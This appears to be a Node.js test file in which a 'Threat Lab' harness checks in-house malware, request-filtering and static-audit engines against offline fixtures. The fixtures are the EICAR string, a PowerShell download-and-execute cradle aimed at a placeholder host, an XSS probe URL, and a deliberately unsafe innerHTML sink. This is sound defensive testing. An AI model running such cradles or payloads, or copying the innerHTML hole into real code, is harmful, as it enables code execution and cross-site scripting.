import test from "node:test";
import assert from "node:assert/strict";
import { mkdtemp, mkdir, rm, writeFile } from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { Readable, Writable } from "node:stream";
import { createThreatLab } from "../src/index.js";
import { EICAR_TEST_STRING } from "../src/fixtures.js";
import { createMalwareEngine } from "../../malware-engine/src/index.js";
import { createSecurityGuardScanner } from "../../malware-engine/src/security-guard-adapter.js";
import { createSecurityGuard } from "../../security-guard/src/index.js";
import { createUploadInspector } from "../../security-guard/src/upload-inspector.js";
import { auditProject } from "../../../src/adapters/filesystem/audit-project.js";

const PNG_HEADER = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
const TEST_MARKER = Buffer.from("deadbeef", "hex");
const EXPECTED_EICAR = Buffer.from(
  "WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo=",
  "base64"
);

async function createWorkspace(t) {
  const root = await mkdtemp(path.join(os.tmpdir(), "jb-threat-lab-engines-"));
  t.after(() => rm(root, { recursive: true, force: true }));
  return root;
}

function outcome(status, summary, metrics = {}, findings = []) {
  return { status, summary, metrics, findings };
}

function createMemoryStore() {
  const quarantine = new Map();
  const approved = new Map();
  return {
    quarantine,
    approved,
    createWriteStream({ uploadId }) {
      const chunks = [];
      return new Writable({
        write(chunk, encoding, callback) {
          chunks.push(Buffer.from(chunk));
          callback();
        },
        final(callback) {
          quarantine.set(uploadId, Buffer.concat(chunks));
          callback();
        }
      });
    },
    async createReadStream({ uploadId }) {
      const bytes = quarantine.get(uploadId);
      if (!bytes) throw new Error("fixture missing from quarantine");
      return Readable.from([bytes]);
    },
    async promote({ uploadId, metadata, expectedSha256, expectedSize }) {
      const bytes = quarantine.get(uploadId);
      if (!bytes || bytes.length !== expectedSize) return { promoted: false };
      approved.set(uploadId, { bytes, metadata, expectedSha256 });
      quarantine.delete(uploadId);
      return { promoted: true };
    },
    async delete({ uploadId }) {
      quarantine.delete(uploadId);
      return { deleted: true };
    }
  };
}

function simulateGuardRequest(guard, url) {
  const response = {
    statusCode: 200,
    headersSent: false,
    writableEnded: false,
    headers: {},
    body: "",
    setHeader(name, value) { this.headers[String(name).toLowerCase()] = value; },
    end(body = "") { this.body = String(body); this.writableEnded = true; }
  };
  let reachedApplication = false;
  guard.middleware({
    url,
    method: "GET",
    headers: {},
    rawHeaders: [],
    socket: { remoteAddress: "127.0.0.1" }
  }, response, () => { reachedApplication = true; });
  return { statusCode: response.statusCode, headers: response.headers, body: response.body, reachedApplication };
}

async function auditFixture(projectPath) {
  return auditProject(projectPath, {
    config: {
      profile: "jb-threat-lab-static-fixture",
      advisories: { enabled: false, required: false }
    },
    scanOptions: {
      maxFiles: 100,
      maxFileBytes: 1_000_000,
      maxTotalBytes: 2_000_000,
      maxDepth: 5
    }
  });
}

test("JB Threat Lab exercises Malware Engine, Security Guard and Expert QA against safe local fixtures", async (t) => {
  const root = await createWorkspace(t);
  const malwareFixtures = path.join(root, "malware-fixtures");
  const malwareQuarantine = path.join(root, "malware-quarantine");
  const guardTemp = path.join(root, "guard-temp");
  const expertProject = path.join(root, "expert-project");
  await Promise.all([
    mkdir(malwareFixtures),
    mkdir(guardTemp),
    mkdir(path.join(expertProject, "src"), { recursive: true })
  ]);

  assert.deepEqual(Buffer.from(EICAR_TEST_STRING), EXPECTED_EICAR,
    "Threat Lab's EICAR fixture must match the exact harmless test string");

  const malwareEngine = createMalwareEngine({ quarantineDir: malwareQuarantine });
  const uploadMalwareEngine = createMalwareEngine({
    quarantineDir: path.join(root, "upload-engine-quarantine"),
    byteSignatures: [{
      id: "threat-lab-upload-marker",
      name: "ThreatLab.TestMarker",
      patternHex: TEST_MARKER.toString("hex")
    }]
  });
  const guardScanner = createSecurityGuardScanner({
    malwareEngine: uploadMalwareEngine,
    tempDirectory: guardTemp,
    maxBytes: 1024 * 1024,
    engineName: "JB Threat Lab Fixture Scanner",
    version: "0.1.0"
  });
  const guard = createSecurityGuard({
    mode: "balanced",
    rateLimit: { enabled: false }
  });

  const lab = createThreatLab({ name: "JB Threat Lab", version: "0.1.0" });

  lab.registerTarget({
    id: "jb-malware-engine",
    kind: "security-engine",
    version: "0.6.2",
    capabilities: ["static-file-triage", "hash-signatures", "byte-signatures", "heuristics"],
    adapter: {
      async runScenario({ scenario }) {
        const fixturePath = path.join(malwareFixtures, scenario.id.replaceAll(".", "-") + ".sample");
        let bytes;
        let expectedStatus;
        if (scenario.id === "malware.eicar.harmless-test") {
          bytes = EXPECTED_EICAR;
          expectedStatus = "malicious";
        } else if (scenario.id === "malware.benign.no-false-positive") {
          bytes = Buffer.from("JB Threat Lab benign text fixture; inert data only.");
          expectedStatus = "no_match";
        } else if (scenario.id === "malware.suspicious.inert-script") {
          bytes = Buffer.from("IEX (New-Object Net.WebClient).DownloadString('https://example.invalid/a')");
          expectedStatus = "suspicious";
        } else {
          return outcome("skip", "No Malware Engine handler for this scenario");
        }
        await writeFile(fixturePath, bytes, { flag: "wx" });
        const report = await malwareEngine.scanFile(fixturePath);
        const passed = report.status === expectedStatus;
        return outcome(
          passed ? "pass" : "fail",
          passed ? "Malware Engine returned the expected static triage status" : "Unexpected Malware Engine status",
          { actualStatus: report.status, expectedStatus, bytes: report.bytes, heuristicScore: report.heuristicScore },
          passed ? [] : [{ code: "MALWARE_STATUS_MISMATCH", expected: expectedStatus, actual: report.status }]
        );
      }
    }
  });

  lab.registerTarget({
    id: "jb-security-guard",
    kind: "runtime-security",
    version: "0.1.0",
    capabilities: ["request-filtering", "upload-inspection", "fail-closed"],
    adapter: {
      async runScenario({ scenario }) {
        if (scenario.id === "guard.request.xss-block") {
          const result = simulateGuardRequest(guard, "/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E");
          const passed = result.statusCode === 403 && !result.reachedApplication;
          return outcome(passed ? "pass" : "fail", passed
            ? "Security Guard blocked the inert XSS-pattern request"
            : "Security Guard did not block the expected request",
          { statusCode: result.statusCode, reachedApplication: result.reachedApplication },
          passed ? [] : [{ code: "GUARD_REQUEST_NOT_BLOCKED" }]);
        }

        if (scenario.id === "guard.upload.malicious-block" || scenario.id === "guard.upload.unknown-quarantine") {
          const malicious = scenario.id === "guard.upload.malicious-block";
          const store = createMemoryStore();
          const inspector = createUploadInspector({
            store,
            scanner: guardScanner,
            maxBytes: 1024,
            scannerTimeoutMs: 5000,
            ingestTimeoutMs: 5000,
            allowedMimeTypes: ["image/png"]
          });
          const bytes = malicious
            ? Buffer.concat([PNG_HEADER, Buffer.from("TEST"), TEST_MARKER])
            : Buffer.concat([PNG_HEADER, Buffer.from("BENIGN-THREAT-LAB-FIXTURE")]);
          let actualCode = "none";
          try {
            await inspector.inspect({
              source: Readable.from([bytes]),
              fileName: "catalog-fixture.png",
              declaredMimeType: "image/png"
            });
          } catch (error) {
            actualCode = error.code ?? "unknown";
          }
          const expectedCode = malicious ? "MALWARE_DETECTED" : "SCAN_NOT_CLEAN";
          const passed = actualCode === expectedCode
            && store.approved.size === 0
            && (malicious ? store.quarantine.size === 0 : store.quarantine.size === 1);
          return outcome(passed ? "pass" : "fail",
            malicious
              ? "Malicious test marker was blocked and never promoted"
              : "No-match mapped to unknown and remained quarantined",
            { actualCode, expectedCode, approved: store.approved.size, quarantined: store.quarantine.size },
            passed ? [] : [{ code: "GUARD_UPLOAD_POLICY_MISMATCH" }]);
        }
        return outcome("skip", "No Security Guard handler for this scenario");
      }
    }
  });

  lab.registerTarget({
    id: "jb-expert-qa",
    kind: "qa-engine",
    version: "0.2.0",
    capabilities: ["local-static-audit", "security-rules", "regression-check"],
    adapter: {
      async runScenario({ scenario }) {
        if (scenario.id !== "expert-qa.static.unsafe-html-detected" &&
            scenario.id !== "expert-qa.static.repaired-html-regression") {
          return outcome("skip", "No Expert QA handler for this scenario");
        }
        const vulnerable = scenario.id === "expert-qa.static.unsafe-html-detected";
        const source = vulnerable
          ? "const params = new URLSearchParams(location.search);\ndocument.querySelector('#result').innerHTML = params.get('name');\n"
          : "const params = new URLSearchParams(location.search);\ndocument.querySelector('#result').textContent = params.get('name');\n";
        await writeFile(path.join(expertProject, "src", "app.js"), source);
        const report = await auditFixture(expertProject);
        const findings = report.diagnostics.filter((item) =>
          item.metadata?.detector === "html-sink-context"
        );
        const passed = vulnerable
          ? findings.some((item) => item.metadata?.classification === "unescaped-untrusted-source")
          : findings.length === 0;
        return outcome(passed ? "pass" : "fail",
          vulnerable
            ? "Expert QA detected the intentionally vulnerable dynamic HTML sink"
            : "Expert QA found no dynamic HTML sink after the safe textContent repair",
          { htmlSinkFindings: findings.length, analyzedFiles: report.analysisScope.filesAnalyzed },
          passed ? [] : [{ code: "EXPERT_QA_HTML_REGRESSION_MISMATCH", findings: findings.length }]);
      }
    }
  });

  const scenarios = [
    ["malware.eicar.harmless-test", "malware-static", "Detect the harmless EICAR test string.", "jb-malware-engine"],
    ["malware.benign.no-false-positive", "malware-static", "Do not flag a benign inert text fixture.", "jb-malware-engine"],
    ["malware.suspicious.inert-script", "malware-static", "Classify inert suspicious script text as suspicious, never confirmed malicious.", "jb-malware-engine"],
    ["guard.request.xss-block", "request-security", "Block a local synthetic XSS-pattern request.", "jb-security-guard"],
    ["guard.upload.malicious-block", "upload-security", "Reject a synthetic signature match before file promotion.", "jb-security-guard"],
    ["guard.upload.unknown-quarantine", "upload-security", "Keep no-match uploads quarantined rather than approving them.", "jb-security-guard"],
    ["expert-qa.static.unsafe-html-detected", "static-code-security", "Detect an intentionally vulnerable HTML sink in source code.", "jb-expert-qa"],
    ["expert-qa.static.repaired-html-regression", "static-code-security", "Verify a repaired textContent implementation has no HTML-sink finding.", "jb-expert-qa"]
  ];
  for (const [id, category, description, targetId] of scenarios) {
    lab.registerScenario({
      id,
      category,
      description,
      appliesTo: [targetId],
      safety: { safe: true, network: false, destructive: false, executesSample: false },
      tags: ["safe-fixture", "offline"]
    });
  }

  const report = await lab.run({
    metadata: {
      suite: "three-core-jb-engines",
      sampleExecution: false,
      networkRequests: 0,
      productionTargets: false
    }
  });

  assert.equal(report.totals.fail, 0, JSON.stringify(report.results.filter((item) => item.status === "fail"), null, 2));
  assert.equal(report.totals.pass, scenarios.length);
  assert.equal(report.totals.skip, 3 * scenarios.length - scenarios.length);
  assert.equal(report.results.length, 3 * scenarios.length);
  assert.deepEqual(
    new Set(report.results.filter((item) => item.status === "pass").map((item) => item.target.id)),
    new Set(["jb-malware-engine", "jb-security-guard", "jb-expert-qa"])
  );
});
